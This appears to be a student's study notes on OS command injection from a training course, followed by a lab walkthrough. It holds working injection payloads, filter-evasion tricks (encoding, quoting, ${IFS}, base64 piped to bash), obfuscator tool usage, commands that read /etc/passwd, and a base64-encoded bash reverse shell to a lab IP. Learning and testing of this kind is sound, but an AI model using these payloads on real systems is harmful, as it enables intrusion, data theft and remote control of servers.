# Detection
For detection, we should look somewhere we can guess an OS command is being executed, such as ping commands. If we are required to insert a IP address, and after that the webapp will try to ping it, that means that probably it has passed our input to the `ping` command:

```bash
ping -c 1 OUR_INPUT
```

This is a good thing because we can inject other OS commands thanks to the injecting operators:

|   |   |   |   |
|---|---|---|---|
|Semicolon|`;`|`%3b`|Both|
|New Line|`\n`|`%0a`|Both|
|Background|`&`|`%26`|Both (second output generally shown first)|
|Pipe|`\|`|`%7c`|Both (only second output is shown)|
|AND|`&&`|`%26%26`|Both (only if first succeeds)|
|OR|`\|\|`|`%7c%7c`|Second (only if first fails)|
|Sub-Shell|` `` `|`%60%60`|Both (Linux-only)|
|Sub-Shell|`$()`|`%24%28%29`|Both (Linux-only)|

For example, we would like to execute a command like that: 

```bash
ping -c 1 127.0.0.1; whoami
```

As we can see from the table above, this will execute both commands. As for other attacks, there could be some type of client-side validation, so we can either bypass it by deleting the validation parameter or we can just use `Burpsuite`. In Burpsuite, our POST request data will look like this:

```shell-session
ip=127.0.0.1%3b+whoami
```

NB: always remember to URL-Encode characters!!

We used the `;` command but we could use either way the `&&`, `&`,  `||`, `|` ecc. Remember that by using logical operator you need to ensure the final logic will work. For exampe, if we use the `&&`, we need to be SURE that the first command will be succesfull, or our second command WILL NOT be execute. The same thing will apply to `||`. This will execute the second command ONLY if the first command FAILS.

# Filter evasion

Let's now talk about evasion. If we try to send the same command (`ip=127.0.0.1%3b+whoami`) we will be outputted with an error: `Invalid input`. This means something in our request has been blackslisted. What we have is: 
1. A semi-colon character `;`
2. A space character
3. A `whoami` command
Two of them are "characters" and one of them is a "command". In this section we will see how to bypass character filtering.
## Bypass blacklisted Characters

A php code that would filter character would look like this: 
```php
$blacklist = ['&', '|', ';', ...SNIP...];
foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

So we can't just use these commands in our request.
NB: it's possible that not every command is blacklisted. A command that usually goes overlooked is the `new-line: \n`. We will be using it in our example from now on.

So what we can craft now is 

```shell-session
ip=127.0.0.1%0a
```

Since we need to use a space with the new-line (i think, not 100% sure) we can use it (URL-encoded) with a `+` but we can see that it's saying `Invalid input` again, so the space is blacklisted.
We can bypass space filters by using the `Tabs: %09` command. This is usually overlooked and will not be filtered. Another thing we can use is system environment variables such as `${IFS}`: this will act like a space.
Another thing we can use is `Bash Brace Expansion: {ls,-la}`.
So our final request will be (one of those):

```shell-session
ip=127.0.0.1%0a%09whoami
ip=127.0.0.1%0a{ls,-la}
ip=127.0.0.1%0a${IFS}whoami
```

In case we want to use a `/` and it's blacklisted, we can use again a global environment variable such as `${PATH}` like this:
`${PATH:0:1} #this will print /`

We can do the same thing for the `;` character (if blacklisted) by using the global environment variable `${LS_COLORS}` like this:
`${LS_COLORS:10:1} #this will print ;`

We can get creative with this. `printenv` prints all the environment variables in Linux, so you can look which ones may contain useful characters

In windows we can get the same thing by using these commands:
`echo` a Windows variable (`%HOMEPATH%` -> `\Users\htb-student`), and then specify a starting position (`~6` -> `\htb-student`), and finally specifying a negative end position, which in this case is the length of the username `htb-student` (`-11` -> `\`)

```cmd-session
C:\htb> echo %HOMEPATH:~6,-11%

\
```

With PowerShell, a word is considered an array, so we have to specify the index of the character we need

```powershell-session
PS C:\htb> $env:HOMEPATH[0]

\
```

We can also use the `Get-ChildItem Env:` similar to the `printenv` of Linux.

We can also use characther shifting like this:

```shell-session
Poiint@htb[/htb]$ man ascii     # \ is on 92, before it is [ on 91
Poiint@htb[/htb]$ echo $(tr '!-}' '"-~'<<<[)

\
```

## Bypass blacklisted Commands
This is a basic command blacklist filter in PHP: 
```php
$blacklist = ['whoami', 'cat', ...SNIP...];
foreach ($blacklist as $word) {
    if (strpos('$_POST['ip']', $word) !== false) {
        echo "Invalid input";
    }
}
```

In `Linux`, we can use single-quote `'` and a double-quote `"` in order to `obfuscate` 

```shell-session
21y4d@htb[/htb]$ w'h'o'am'i # ' must be even!

21y4d
```

The same works with double-quotes as well:

```shell-session
21y4d@htb[/htb]$ w"h"o"am"i

21y4d
```

So our crafted payload would be:

The same works with double-quotes as well:

```shell-session
127.0.0.1%0aw'h'o'am'i
```

We can also use `\` and `$@`:
```bash
who$@ami
w\ho\am\i
```

In `Windows` we can use the caret (`^`) character:

```cmd-session
C:\htb> who^ami

21y4d
```

We can also use `Case Manipulation`

```powershell-session
PS C:\htb> WhOaMi

21y4d
```

Linux is case-sensitive, so we need to get creative:

```shell-session
21y4d@htb[/htb]$ $(tr "[A-Z]" "[a-z]"<<<"WhOaMi")

21y4d
```

By using the latest technique, our payload would be like this:

```shell-session
127.0.0.1%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

But this doesn't work. `why?` Because the command contains spaces and as we said before, they are blacklisted. We need to substitute the spaces with the tabs (`%09`), and our final payload would be:

```shell-session
127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
```

This will work! another command for that purpose that we can use is that:

```bash
$(a="WhOaMi";printf %s "${a,,}")
```

If you look carefully it contains some blacklisted characters (as `;`) so be sure of substituting blacklisted character.

We can also sure `Reversed Commands`:

```shell-session
Poiint@htb[/htb]$ echo 'whoami' | rev
imaohw
```

Then, we can execute the original command by reversing it back in a sub-shell (`$()`), as follows:

```shell-session
21y4d@htb[/htb]$ $(rev<<<'imaohw')

21y4d
```

Our crafted payload would look like this:

```shell-session
127.0.0.1%0a$(rev<<<'imaohw')
```

The same can be done in `Windows`:

```powershell-session
PS C:\htb> "whoami"[-1..-20] -join ''

imaohw
```

We can now use the below command to execute a reversed string with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell-session
PS C:\htb> iex "$('imaohw'[-1..-20] -join '')"

21y4d
```

The final technique is `Encoded Commands`. We can use `base64` or `xxd` for encoding. Let's take `base64` as an example. 

```shell-session
Poiint@htb[/htb]$ echo -n 'cat /etc/passwd | grep 33' | base64

Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

Now we can create a command that will decode the encoded string in a sub-shell (`$()`), and then pass it to `bash` to be executed (i.e. `bash<<<`), as follows:

```shell-session
Poiint@htb[/htb]$ bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)

www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

Tip: Note that we are using `<<<` to avoid using a pipe `|`, which is a filtered character.

So our final payload would look like:

```shell-session
127.0.0.1%0abash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

NB: look that we also substituted spaces with the tab `%09` character!

We can do the same technique in Windows:

```powershell-session
PS C:\htb> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

dwBoAG8AYQBtAGkA
```

We may also achieve the same thing on Linux, but we would have to convert the string from `utf-8` to `utf-16` before we `base64` it, as follows:

```shell-session
Poiint@htb[/htb]$ echo -n whoami | iconv -f utf-8 -t utf-16le | base64

dwBoAG8AYQBtAGkA
```

Finally, we can decode the b64 string and execute it with a PowerShell sub-shell (`iex "$()"`), as follows:

```powershell-session
PS C:\htb> iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"

21y4d
```

In addition to the techniques we discussed, we can utilize numerous other methods, like wildcards, regex, output redirection, integer expansion, and many others. 
We can find some such techniques on [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-with-variable-expansion


# Evasion Tools

### Linux (Bashfuscator)

A handy tool we can utilize for obfuscating bash commands is [Bashfuscator](https://github.com/Bashfuscator/Bashfuscator). We can clone the repository from GitHub and then install its requirements, as follows:

```shell-session
Poiint@htb[/htb]$ git clone https://github.com/Bashfuscator/Bashfuscator
Poiint@htb[/htb]$ cd Bashfuscator
Poiint@htb[/htb]$ python3 setup.py install --user
```

Once we have the tool set up, we can start using it from the `./bashfuscator/bin/` directory. There are many flags we can use with the tool to fine-tune our final obfuscated command, as we can see in the `-h` help menu:

```shell-session
Poiint@htb[/htb]$ cd ./bashfuscator/bin/
Poiint@htb[/htb]$ ./bashfuscator -h
```

We can start by simply providing the command we want to obfuscate with the `-c` flag:

```shell-session
Poiint@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd'
```

However, running the tool this way will randomly pick an obfuscation technique, which can output a command length ranging from a few hundred characters to over a million characters! So, we can use some of the flags from the help menu to produce a shorter and simpler obfuscated command, as follows:

```shell-session
Poiint@htb[/htb]$ ./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1

[+] Mutators used: Token/ForCode
[+] Payload:
eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"
[+] Payload size: 104 characters
```

We can now test the outputted command with `bash -c ''`, to see whether it does execute the intended command:

```shell-session
Poiint@htb[/htb]$ bash -c 'eval "$(W0=(w \  t e c p s a \/ d);for Ll in 4 7 2 1 8 3 2 4 8 5 7 6 6 0 9;{ printf %s "${W0[$Ll]}";};)"'

root:x:0:0:root:/root:/bin/bash
...SNIP...
```


### Windows (DOSfuscation)

There is also a very similar tool that we can use for Windows called [DOSfuscation](https://github.com/danielbohannon/Invoke-DOSfuscation). Unlike `Bashfuscator`, this is an interactive tool, as we run it once and interact with it to get the desired obfuscated command. We can once again clone the tool from GitHub and then invoke it through PowerShell, as follows:

```powershell-session
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
Invoke-DOSfuscation> help

HELP MENU :: Available options shown below:
[*]  Tutorial of how to use this tool             TUTORIAL
...SNIP...

Choose one of the below options:
[*] BINARY      Obfuscated binary syntax for cmd.exe & powershell.exe
[*] ENCODING    Environment variable encoding
[*] PAYLOAD     Obfuscated payload via DOSfuscation
```

We can even use `tutorial` to see an example of how the tool works. Once we are set, we can start using the tool, as follows:

```powershell-session
Invoke-DOSfuscation> SET COMMAND type C:\Users\htb-student\Desktop\flag.txt
Invoke-DOSfuscation> encoding
Invoke-DOSfuscation\Encoding> 1

...SNIP...
Result:
typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt
```
Finally, we can try running the obfuscated command on `CMD`, and we see that it indeed works as expected:
```cmd-session
C:\htb> typ%TEMP:~-3,-2% %CommonProgramFiles:~17,-11%:\Users\h%TMP:~-13,-12%b-stu%SystemRoot:~-4,-3%ent%TMP:~-19,-18%%ALLUSERSPROFILE:~-4,-3%esktop\flag.%TMP:~-13,-12%xt

test_flag
```

# Prevention
For prevention, check course material




# Skill Assessment
Once logged in (i didn't read the question so i skipped credentials: i found them on the github page, could be useful for later ctfs!) we are displayed in a file sharing website. We can see the content of .txt files. There's also a search file. In order to find the detection point, we want to look for network traffic. The search feature doesn't make any network traffic, so it's full handled by the back-end. We see that the copy and the move commands actually do generate network traffic, so they are a good injection point. I've tried with move feature since by just poking with the webapp, i returned once a "Malicious Action" or something like that. If we get any type of this error back, it means there's some type of filtering. The first step is to check whatever character is blacklisted. We find that the character `&` is not filtered, so we can use it to make an injection. I lost a lot of time in this lab because i forced myself to use `&&` for too long but logical operators are the hardest in my opinion. What we can try is just to execute a simple command with the whitelisted character to see if we have a good feedback. The injection had to be made in the URL so we're talking about a GET request. It was something like this:

```shell-session
/index.php?to=&from=12341241.txt&finish=1&move=1
```

Here we need to guess a bit. Since the feature is to "move" a file into another directory, the web-server is probably asking the OS to execute the `mv` command, which takes two input, the one from the `to=` parameter and the second from `from=` parameter. I think in this case the injection can be made from both parameter for this reason.
We can start executing a simple OS injection:

```shell-session
/index.php?to=${IFS}--version&from=12341241.txt&finish=1&move=1
```

This particular command `--version` doesn't work by using `%26`, but does with `${IFS}`. Another simple command that we can use is:

```
/index.php?to=%26--version&from=51459716.txt&finish=1&move=1
```

This does indeed work and give us a listing of the current directory. From here i tried to poke around with reverse shells but had no luck. We can also use b64 encoding in order to get the `ls` command executed:

```shell-session
┌──(poiint㉿Kali)-[~/commix]
└─$ echo -n "ls -la" | base64                                                   
bHMgLWxh
```

Now we can use this syntax in order to execute this command:

```shell-session
bash<<<$(base64%09-d<<<bHMgLWxh)
```

```shell-session
/index.php?to=%26bash<<<$(base64%09-d<<<bHMgLWxh)&from=51459716.txt&finish=1&move=1 
```

If we try that with a reverse shell:
```
┌──(poiint㉿Kali)-[~/commix]
└─$ echo -n "bash -i >& /dev/tcp/10.10.15.45/8000 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS40NS84MDAwIDA+JjE=
```

We get `Malicious Request!`. I don't know if it has something to do with the lab or if the command is totally wrong. Anyway we can get the flag in the root directory like this:

```shell-session
┌──(poiint㉿Kali)-[~/commix]
└─$ echo -n "cat /flag.txt" | base64
Y2F0IC9mbGFnLnR4dA==
```

So our final payload would be:

```shell-session
/index.php?to=%26bash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dA==)&from=51459716.txt&finish=1&move=1
```

#Edit: found out why the lab would say `Malicious Request!` to the above payload. It's because of the `+` in the base64 string, which filtered, they will make the request illegal. You can bypass this problem by just adding spaces to the revshell until the `+` disappear.